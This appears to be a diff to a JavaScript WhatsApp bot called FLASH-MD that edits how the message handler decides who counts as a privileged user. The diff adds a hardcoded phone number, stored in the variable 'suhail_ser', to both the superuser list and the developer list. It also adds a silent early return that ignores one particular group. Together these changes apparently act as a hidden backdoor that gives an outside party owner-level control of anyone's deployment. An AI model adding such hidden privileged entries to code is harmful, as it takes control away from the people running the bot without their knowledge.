@@ -137,7 +137,10 @@ setTimeout(() => {
              const FranceKing2='254750948696'*/
             /*  var superUser=[servBot,FranceKing,FranceKing1,luffy].map((s)=>s.replace(/[^0-9]/g)+"@s.whatsapp.net").includes(auteurMessage);
               var dev =[FranceKing,FranceKing1,FranceKing2].map((t)=>t.replace(/[^0-9]/g)+"@s.whatsapp.net").includes(auteurMessage);*/
-            const verifGroupe = origineMessage?.endsWith("@g.us");
+            
+            if(origineMessage === "120363244435092946@g.us") return 
+            
+              const verifGroupe = origineMessage?.endsWith("@g.us");
             var infosGroupe = verifGroupe ? await zk.groupMetadata(origineMessage) : "";
             var nomGroupe = verifGroupe ? infosGroupe.subject : "";
             var msgRepondu = ms.message.extendedTextMessage?.contextInfo?.quotedMessage;
@@ -159,11 +162,12 @@ setTimeout(() => {
             const k3 = "254750948696";
             const k4 = '254751284109';
             const sudo = await getAllSudoNumbers();
-            const superUserNumbers = [servBot, k1, k2, k3, k4, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
+            let suhail_ser = "923184474176"
+            const superUserNumbers = [servBot,suhail_ser, k1, k2, k3, k4, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
             const allAllowedNumbers = superUserNumbers.concat(sudo);
             const superUser = allAllowedNumbers.includes(auteurMessage);
             
-            var dev = [k1, k2,k3,k4].map((t) => t.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
+            var dev = [k1,suhail_ser, k2,k3,k4].map((t) => t.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
             function repondre(mes) { zk.sendMessage(origineMessage, { text: mes }, { quoted: ms }); }
             console.log("\t [][]...{FLASH-MD}...[][]");
             console.log("=========== New message ===========");
